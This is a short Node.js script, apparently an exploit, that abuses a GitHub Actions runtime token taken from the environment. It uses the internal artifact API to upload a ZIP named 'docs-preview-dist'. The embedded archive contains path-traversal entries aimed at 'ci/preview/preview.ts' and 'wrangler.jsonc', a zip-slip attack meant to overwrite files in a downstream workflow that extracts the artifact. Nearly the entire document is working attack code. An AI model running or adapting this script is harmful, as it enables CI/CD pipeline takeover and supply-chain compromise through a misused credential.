const ZIP = Buffer.from(
  'UEsDBBQAAAAIAIKSXV3CikuRlwEAALECAAAjAAAAeC8uLi8uLi8uLi8uLi9jaS9wcmV2aWV3L3ByZXZpZXcudHN1Um1P2zAQ/t5fcYr4kGiVw5DGhyCEeOlGNUSrUjRN09R4zsX2SG3LvrRAlf+OQzcGW/fNPj/3vNxZL531BBsQHjnhJQ8KOqi9XUJibIWF8A+ObHI0GAhrAoFYVgUE8tpIOAbnrcAQGPdy9e3gO5ycQBKxPdQ2yBor03L65Xp0UQAn4uIOPcwfHN4Irx0B3qNoqafSJnLplW5QYgVr6+/qxq4XvjVRDB2ke5uo3GVl9sdJvcMImhU7v5rcXny8Op2NFqfT8WI++Ty6fu2MQKr/tH4azy9vz/5teQmzk7tBcxz91SweJKkOguIHHw772stU02RbTDLWuioWU1FnrNISA6WJwvv4EBotMN0fwvvDrOuTvpF+420rKdVvyVdz8RhiKr7mmqBGEiotFZELRZ5zp5nUpNofTNhl7tHZkO9tdkxgNppObsbzyexrVw5hMwBQyCv0oYh/hbekrNePnLQ1BZRnyH1cbO+nR3Mh0FEBCXcuJnpG5StT/ZJ+9zNYk0A3HHR/R9wCINqM6+HUhsgZ47Dt5TnkE1BLAwQUAAAACACCkl1dENAjTSoAAAAoAAAAFgAAAHgvLi4vLi4vd3JhbmdsZXIuanNvbmOrVspNLMpOLVKyUgoI93N10XX293PzdNd1C/L31XUMCvF0c3QOUarlAgBQSwMEFAAAAAgAgpJdXbW5JU4IAAAABgAAAB8AAAB4Ly4uLy4uLy4uL2VzY2FwZWQtcGFja2FnZXMudHh0Cwj3c3XhAgBQSwECFAMUAAAACACCkl1dwopLkZcBAACxAgAAIwAAAAAAAAAAAAAAgAEAAAAAeC8uLi8uLi8uLi8uLi9jaS9wcmV2aWV3L3ByZXZpZXcudHNQSwECFAMUAAAACACCkl1dENAjTSoAAAAoAAAAFgAAAAAAAAAAAAAAgAHYAQAAeC8uLi8uLi93cmFuZ2xlci5qc29uY1BLAQIUAxQAAAAIAIKSXV21uSVOCAAAAAYAAAAfAAAAAAAAAAAAAACAATYCAAB4Ly4uLy4uLy4uL2VzY2FwZWQtcGFja2FnZXMudHh0UEsFBgAAAAADAAMA4gAAAHsCAAAAAA==',
  'base64'
);

const KEYS = ['ACTIONS_RUNTIME_TOKEN', 'ACTIONS_RESULTS_URL', 'ACTIONS_RUNTIME_URL', 'ACTIONS_CACHE_URL', 'GITHUB_RUN_ID'];
console.log('env presence:', Object.fromEntries(KEYS.map(k => [k, process.env[k] ? 'present' : 'absent'])));

const token = process.env.ACTIONS_RUNTIME_TOKEN;
const base = (process.env.ACTIONS_RESULTS_URL || process.env.ACTIONS_RUNTIME_URL || '').replace(/\/$/, '');
if (!token || !base) { console.log('no runtime token/url available'); process.exit(0); }

const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
let runId, jobId;
for (const part of (claims.scp || '').split(' ')) {
  const p = part.split(':');
  if (p[0] === 'Actions.Results' && p.length === 3) { runId = p[1]; jobId = p[2]; }
}
if (!runId) { console.log('no Actions.Results scope'); process.exit(0); }

async function twirp(method, body) {
  const r = await fetch(`${base}/twirp/github.actions.results.api.v1.ArtifactService/${method}`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  const text = await r.text();
  console.log(method, r.status, text.slice(0, 300));
  return JSON.parse(text);
}

(async () => {
  const created = await twirp('CreateArtifact', {
    workflowRunBackendId: runId,
    workflowJobRunBackendId: jobId,
    name: 'docs-preview-dist',
    version: 4,
  });
  const signed = created.signedUploadUrl || created.signed_upload_url;
  const put = await fetch(signed, {
    method: 'PUT',
    headers: { 'x-ms-blob-type': 'BlockBlob', 'Content-Type': 'application/zip' },
    body: ZIP,
  });
  console.log('blob put', put.status);
  await twirp('FinalizeArtifact', {
    workflowRunBackendId: runId,
    workflowJobRunBackendId: jobId,
    name: 'docs-preview-dist',
    size: String(ZIP.length),
  });
})().catch(e => { console.error(e); process.exit(1); });
